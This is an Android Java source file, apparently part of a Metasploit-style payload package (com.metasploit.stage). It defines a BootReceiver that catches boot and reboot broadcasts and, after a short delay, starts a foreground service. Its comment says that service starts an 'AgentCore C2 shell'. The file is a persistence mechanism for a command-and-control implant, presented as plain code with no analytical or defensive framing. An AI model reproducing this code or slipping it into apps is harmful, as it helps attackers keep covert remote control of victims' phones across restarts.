package com.metasploit.stage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * BOOT_COMPLETED + QUICKBOOT_POWERON + REBOOT receiver.
 * Starts DlsService (which in turn starts AgentCore C2 shell).
 * Delayed start (3s) to let system settle after boot.
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        if (action == null) return;
        if (!Intent.ACTION_BOOT_COMPLETED.equals(action)
            && !"android.intent.action.QUICKBOOT_POWERON".equals(action)
            && !Intent.ACTION_REBOOT.equals(action)) {
            return;
        }

        // Let system settle, then launch
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override public void run() {
                launch(context);
            }
        }, 3000);
    }

    static void launch(Context ctx) {
        Intent svc = new Intent(ctx, DlsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(svc);
        } else {
            ctx.startService(svc);
        }
    }
}
